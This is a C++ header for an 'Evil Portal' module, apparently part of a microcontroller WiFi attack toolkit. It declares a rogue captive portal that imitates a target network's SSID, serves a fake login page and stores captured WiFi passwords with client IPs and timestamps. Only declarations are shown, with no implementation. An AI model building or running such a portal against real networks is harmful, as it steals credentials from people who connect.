#ifndef EVIL_PORTAL_MODULE_H
#define EVIL_PORTAL_MODULE_H

#include "../core/module_manager.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <vector>

struct CapturedCredential {
    String ssid;
    String password;
    String timestamp;
    IPAddress clientIP;
};

class EvilPortalModule : public IModule {
public:
    EvilPortalModule() {}
    
    const char* getName() const override { return "Evil Portal"; }
    void setup() override;
    void loop() override;
    
    // Portal control
    bool startPortal(const String& ssid, const String& targetSSID = "");
    void stopPortal();
    bool isPortalActive() const { return portalActive; }
    
    // Credential management
    std::vector<CapturedCredential> getCapturedCredentials() const { return credentials; }
    void clearCredentials();
    int getCredentialCount() const { return credentials.size(); }
    
private:
    bool portalActive = false;
    String portalSSID;
    String targetSSID;
    DNSServer* dnsServer = nullptr;
    WebServer* webServer = nullptr;
    std::vector<CapturedCredential> credentials;
    
    // Web server handlers
    void handleRoot();
    void handlePost();
    void handleSuccess();
    void handleNotFound();
    
    // HTML templates
    String getLoginPage();
    String getSuccessPage();
    
    // Helper methods
    void captureCredential(const String& password);
    String getCurrentTimestamp();
};

#endif // EVIL_PORTAL_MODULE_H
